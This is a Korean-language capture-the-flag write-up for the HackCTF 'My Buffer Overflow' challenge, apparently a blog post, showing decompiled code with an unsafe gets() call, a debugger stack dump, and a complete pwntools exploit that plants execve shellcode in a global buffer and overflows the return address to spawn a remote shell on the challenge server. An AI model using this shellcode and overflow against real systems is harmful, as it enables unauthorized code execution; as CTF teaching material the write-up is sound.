---


---

<h1 id="hackctfmy-buffer-overflow">HackCTF:My Buffer Overflow</h1>
<h2 id="section">2019-08-09</h2>
<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+0h] [ebp-14h]

  setvbuf(stdout, 0, 2, 0);
  printf("Name : ");
  read(0, &amp;name, 0x32u);
  printf("input : ");
  gets(&amp;s);
  return 0;
}
</code></pre>
<p><code>read()</code> 함수로 50byte 만큼 name 배열에 입력 받은 후 <code>gets()</code>함수로 20byte의 배열 s에 입력을 받는다.<br>
추측한 공격 방법으론 name배열에 <code>system("/bin/bash")</code> 의 쉘 코드를 입력한 뒤 gets()함수로 그 쉘코드를 실행 시키는 것이다.</p>
<pre><code>─────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────
   0x80484fb &lt;main+48&gt;    call   read@plt &lt;0x8048370&gt;
 
 ► 0x8048500 &lt;main+53&gt;    add    esp, 0xc
   0x8048503 &lt;main+56&gt;    push   0x80485b8
   0x8048508 &lt;main+61&gt;    call   printf@plt &lt;0x8048380&gt;
 
   0x804850d &lt;main+66&gt;    add    esp, 4
   0x8048510 &lt;main+69&gt;    lea    eax, [ebp - 0x14]
   0x8048513 &lt;main+72&gt;    push   eax
   0x8048514 &lt;main+73&gt;    call   gets@plt &lt;0x8048390&gt;
 
   0x8048519 &lt;main+78&gt;    add    esp, 4
   0x804851c &lt;main+81&gt;    mov    eax, 0
   0x8048521 &lt;main+86&gt;    leave  
──────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────
00:0000│ esp  0xffffcf88 ◂— 0x0
01:0004│      0xffffcf8c —▸ 0x804a060 (name) ◂— inc    ecx /* 0x41414141; 'AAAA\n' */
02:0008│      0xffffcf90 ◂— 0x32 /* '2' */
</code></pre>
<p>함수 <code>read()</code>로 받는 부분 뒤를 break하여 "AAAA"를 입력한 뒤 스택을 관찰했다.<br>
0x804a060에 name 배열이 위치해 있으며 "AAAA"가 성공적으로 들어갔다.</p>
<pre><code>from pwn import *
p = remote('ctf.j0n9hyun.xyz', 3003)

name_address = 0x804a060
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

print p.recvuntil(": ")
p.sendline(shellcode)

payload = ''
payload += "A" * 24
payload += p32(name_address)

print p.recvuntil(": ")
p.sendline(payload)

p.interactive()
</code></pre>

